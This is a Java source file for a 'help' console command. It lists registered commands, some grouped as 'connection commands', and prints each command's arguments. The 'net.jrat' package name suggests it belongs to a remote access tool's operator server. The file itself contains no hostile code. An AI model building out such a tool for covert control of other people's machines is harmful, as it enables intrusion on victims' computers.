package net.jrat.core.command.commands;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.utils.Logger;

public class Help extends Command
{
	public Help()
	{
		super("help", new String[] { "command" }, new String[] { "sets the command" }, "shows you some help");
	}

	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		final String commandName = commandLine.getOptionValue("command", null);
		
		if(commandName == null)
		{
			Logger.log("see all commands below");
			{
				Logger.startFrequence();
				
				for(int i = 0; i < this.server.commandManager.commands.size(); i++)
				{
					final Command command = this.server.commandManager.commands.get(i);
					final String line = command.name + " - " + command.description + " | type \"help -command " + command.name + "\" for more information";
					Logger.log(line);
					
					if(i == 6)
					{
						Logger.space();
						Logger.log("connection commands");
						Logger.startFrequence();
					}
				}
				
				Logger.stopFrequence();
				Logger.log("connection commands");
				
				Logger.stopFrequence();
			}
			Logger.log("thats all");
		}
		else
		{
			final Command command = this.server.commandManager.getCommand(commandName);
			
			if(command == null)
				throw new Exception("command not found");
			
			Logger.log("showing help for " + command.name);
			{
				Logger.startFrequence();
				
				Logger.log("name: " + command.name);
				Logger.log("description: " + command.description);
				
				Logger.space();
				
				Logger.log("arguments");
				{
					Logger.startFrequence();
					
					for(int i = 0; i < command.arguments.length; i++)
					{
						final String argument = command.arguments[i];
						String meaning = "";
						
						for(int j = 0; j < command.meanings.length; j++)
						{
							if(j == i)
							{
								meaning = command.meanings[i];
								break;
							}
						}
						
						Logger.log(argument + " | " + meaning);
					}
					
					Logger.stopFrequence();
				}
				Logger.log("arguments");
				
				Logger.stopFrequence();
			}
			Logger.log("done");
		}
	}
}
